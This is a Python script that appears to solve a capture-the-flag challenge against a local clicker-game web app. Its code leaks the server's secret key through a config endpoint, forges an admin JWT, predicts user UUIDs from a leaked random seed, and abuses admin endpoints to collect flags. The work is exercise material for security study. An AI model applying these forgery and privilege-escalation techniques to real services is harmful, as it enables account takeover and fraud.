import jwt
import random
import requests
from requests.compat import urljoin
import time
import uuid

BASE_URL = 'http://localhost:8000/'


def register(data):
    r = requests.post(urljoin(BASE_URL, '/user/register'), json=data)
    if 'Authorization' not in r.json():
        return r.json()
    return r.json()['Authorization']


def login(data):
    r = requests.post(urljoin(BASE_URL, '/user/login'), json=data)
    if 'Authorization' not in r.json():
        return r.json()
    return r.json()['Authorization']


def logout(auth):
    r = requests.post(urljoin(BASE_URL, '/user/logout'),
                      headers=auth_header(auth))
    return r.json()


def auth_header(auth):
    return {'Authorization': auth}


def purchase(auth, clicker):
    r = requests.post(urljoin(BASE_URL, '/clicker/purchase'),
                      headers=auth_header(auth),
                      json={'name': clicker})
    return r.text


def click(auth, clicker):
    r = requests.post(urljoin(BASE_URL, '/clicker/click'),
                      headers=auth_header(auth),
                      json={'name': clicker})
    return r.text


def user_info(auth):
    r = requests.get(urljoin(BASE_URL, '/user'), headers=auth_header(auth))
    return r.json()


def user_money(auth):
    info = user_info(auth)
    if 'money' in info:
        return info['money']
    return None


def admin_header():
    url = urljoin(BASE_URL, '/clicker/Config') + '?field=SECRET_KEY'
    r = requests.get(url)
    key = r.json()['SECRET_KEY']
    auth_token = jwt.encode({
        "exp": 9999999999,
        "iat": 1537487052,
        "sub": 1,
        "admin": True
    }, key, algorithm='HS256')
    admin_header = {'Authorization': auth_token}
    return admin_header


def get_all_clickers():
    r = requests.get(urljoin(BASE_URL, '/clicker'))
    return r.json()


def get_clicker(clicker):
    r = requests.get(urljoin(BASE_URL, '/clicker/') + clicker)
    return r.text


def get_user_clickers(auth):
    r = requests.get(urljoin(BASE_URL, '/clicker/user'),
                     headers=auth_header(auth))
    return r.json()


def get_seed():
    url = urljoin(BASE_URL, '/clicker/Config') + '?field=SEED'
    r = requests.get(url)
    return r.json()['SEED']


def get_secret():
    url = urljoin(BASE_URL, '/clicker/Config') + '?field=SECRET_KEY'
    r = requests.get(url)
    return r.json()['SECRET_KEY']


def uuid4():
    a = "%32x" % random.getrandbits(128)
    rd = a[:12] + '4' + a[13:16] + 'a' + a[17:]
    return uuid.UUID(rd)


def get_uuid(auth):
    random.seed(get_seed())
    id = jwt.decode(auth, get_secret())['sub']
    for _ in range(id - 1):
        uuid4()
    return uuid4()


def add_money(auth, amount):
    requests.post(urljoin(BASE_URL, '/default/admin/money'),
                  headers=admin_header(),
                  json={'uuid': str(get_uuid(auth)), 'value': amount})


def max_account(auth):
    add_money(auth, 50000000000 * 25)
    for _ in range(11):
        purchase(auth, 'captiosus')


def add_uuid(auth, amount):
    requests.post(urljoin(BASE_URL, '/default/admin/uuid'),
                  headers=admin_header(),
                  json={'uuid': str(get_uuid(auth)), 'value': amount})


def flag1():
    status = None
    while not status or status == 404:
        r = requests.get(urljoin(BASE_URL, '/default'),
                         headers={'bring_back_random_click': 'a' * 10})
        status = r.status_code
    return r.text


def flag2():
    auth_token = register(
        {'username': str(uuid.uuid4()), 'password': str(uuid.uuid4())}
    )
    purchase(auth_token, 'base')
    add_money(auth_token, 21)
    purchase(auth_token, 'momo')
    purchase(auth_token, 'momo')
    r = requests.get(urljoin(BASE_URL, '/default/money'),
                     headers=auth_header(auth_token))
    return r.text


def flag3():
    auths = []
    for _ in range(14):
        auths.append(register(
            {'username': str(uuid.uuid4()), 'password': str(uuid.uuid4())}
        ))
    largest_uuid = max([int(get_uuid(x)) for x in auths])
    for auth in auths:
        max_account(auth)
        curr_uuid = get_uuid(auth)
        add_uuid(auth, largest_uuid - int(curr_uuid))

    for _ in range(13):
        for auth in auths:
            click(auth, 'captiosus')

    r = requests.get(urljoin(BASE_URL, '/default/record'),
                     headers=auth_header(auths[0]))
    return r.text


# print('ENDPOINTS----------------')
# print('EMPTY REGISTRATION')
# print(register({}))
# print('SHORT PASSWORD')
# print(register({'username': 'a', 'password': ''}))
# print('SHORT USERNAME')
# print(register({'username': 'a', 'password': 'asdlkjsakldjas'}))
# print('DUPLICATE USER')
# register({'username': 'adjksdh', 'password': 'asdlkjsakldjas'})
# print(register({'username': 'adjksdh', 'password': 'asdlkjsakldjas'}))
# print('CREATE USER')
# user = str(uuid.uuid4())
# pw = str(uuid.uuid4())
# auth = register({'username': user, 'password': pw})
# print(auth)
# print('CHECK REGISTER')
# print(user_info(auth))
# print('')
# print('EMPTY LOGOUT')
# print(logout(''))
# print('REAL LOGOUT')
# print(logout(auth))
# print('CHECK LOGOUT')
# print(user_info(auth))
# print('')
# print('EMPTY LOGIN')
# print(login({}))
# print('WRONG PASSWORD')
# print(login({'username': 'adjksdh', 'password': ''}))
# print('NONEXISTENT USERNAME')
# print(login({'username': str(uuid.uuid4()), 'password': 'asdlkjsakldjas'}))
# print('LOGIN USER')
# time.sleep(1)
# auth = login({'username': user, 'password': pw})
# print(auth)
# print('CHECK LOGIN')
# print(user_info(auth))
# print('')
# print('PURCHASE CLICKER NO USER')
# print(purchase('', 'base'))
# print('PURCHASE CLICKER NO CLICKER')
# print(purchase(auth, 'based'))
# print('PURCHASE CLICKER EXPENSIVE')
# print(purchase(auth, 'captiosus'))
# print('PURCHASE CLICKER')
# print(purchase(auth, 'base'))
# print('')
# print('USE CLICKER NO USER')
# print(click('', 'base'))
# print('USE CLICKER NO CLICKER')
# print(click(auth, 'based'))
# print('USE CLICKER NOT OWNED')
# print(click(auth, 'captiosus'))
# print('USE CLICKER')
# print(click(auth, 'base'))
# print('')
# print('ADD NEGATIVE MONEY')
# add_money(auth, -500)
# print(user_money(auth) < 0)
# print('ADD MONEY')
# add_money(auth, 999999)
# print(user_money(auth))
# print('ADD LOTS OF MONEY')
# add_money(auth, 9999999999999999999999999)
# print(user_money(auth))
# print('MAX ACCOUNT')
# max_account(auth)
# print(user_money(auth))
# print(get_user_clickers(auth))
# print('PURCHASE CLICKER MAX')
# print(purchase(auth, 'captiosus'))
# print('ADD NEGAITVE UUID')
# add_uuid(auth, -5)
# print(user_info(auth))
# print('ADD UUID')
# add_uuid(auth, 999999)
# print(user_info(auth))
# print('ADD LOTS OF UUID')
# add_uuid(auth, 9999999999999999999999999999999999999999999999999999999999999)
# print(user_info(auth))
#
# print('ADD MONEY NO UUID')
# r = requests.post(urljoin(BASE_URL, '/default/admin/money'),
#                   headers=admin_header(),
#                   json={'uuid': 'sahdk', 'value': 5})
# print(r.text)
# print('ADD MONEY NO ADMIN')
# r = requests.post(urljoin(BASE_URL, '/default/admin/money'),
#                   headers={},
#                   json={'uuid': str(get_uuid(auth)), 'value': 5})
# print(r.text)
#
# print('ADD UUID NO UUID')
# r = requests.post(urljoin(BASE_URL, '/default/admin/uuid'),
#                   headers=admin_header(),
#                   json={'uuid': 'sahdk', 'value': 5})
# print(r.text)
# print('ADD UUID NO ADMIN')
# r = requests.post(urljoin(BASE_URL, '/default/admin/uuid'),
#                   headers={},
#                   json={'uuid': str(get_uuid(auth)), 'value': 5})
# print(r.text)
# print('')
# print('GET SEED')
# print(get_seed())
# print('GET SECRET')
# print(get_secret())
# print('')
# print('CHECK BAN')
# while True:
#     print(click(auth, 'base'))

print('FLAGS--------------------')
print(flag1())
print(flag2())
print(flag3())
